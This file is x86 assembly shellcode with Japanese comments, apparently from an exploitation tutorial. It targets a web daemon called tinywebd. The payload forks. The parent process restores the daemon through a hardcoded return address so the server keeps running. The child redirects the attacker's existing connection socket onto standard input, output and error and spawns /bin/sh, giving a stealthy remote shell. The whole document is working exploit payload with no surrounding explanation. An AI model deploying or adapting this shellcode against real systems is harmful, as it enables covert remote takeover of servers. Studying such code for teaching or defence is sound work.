BITS 32 

   push BYTE 0x02    ; forkはシステムコール#2 
   pop eax 
   int 0x80          ; フォーク後、子プロセスのeax == 0
   test eax, eax 
   jz child_process  ; 子プロセスの場合、シェルを起動する。

      ; 親プロセスの場合、tinywebdを復元する。
   lea ebp, [esp+0x68]  ; ebpを復元する。
   push 0x08048fb7      ; 戻りアドレス
   ret                  ; リターン

child_process: 
      ; 既存のソケットを再利用する。
   lea edx, [esp+0x5c]  ; new_sockfdのアドレスをedxに設定する。
   mov ebx, [edx]       ; new_sockfdの値をebxに設定する。
   push BYTE 0x02 
   pop ecx          ; ecxは2から開始
   xor eax, eax 
   xor edx, edx 
dup_loop: 
   mov BYTE al, 0x3F ; dup2システムコールは63番
   int 0x80          ; dup2(c, 0) 
   dec ecx           ; 0へのカウントダウン
   jns dup_loop      ; 符号フラグがセットされていない場合、ecxは負ではない。


; execve(const char *filename, char *const argv [], char *const envp[]) 
   mov BYTE al, 11   ; execveはシステムコール11番
   push edx          ; 文字列の終端のためにnullをいくつかプッシュする。
   push 0x68732f2f   ; スタックに"//sh"をプッシュする。
   push 0x6e69622f   ; スタックに"/bin"をプッシュする。
   mov ebx, esp      ; "/bin//sh"のアドレスをesp経由でebxに設定する。
   push edx          ; 32ビットのnull終端をスタックにプッシュする。
   mov edx, esp      ; これはenvpの空配列となる。
   push ebx          ; スタック上のnull終端の上に文字列アドレスをプッシュする。
   mov ecx, esp      ; これは文字列ポインタを伴うargv配列となる。
   int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL]) 
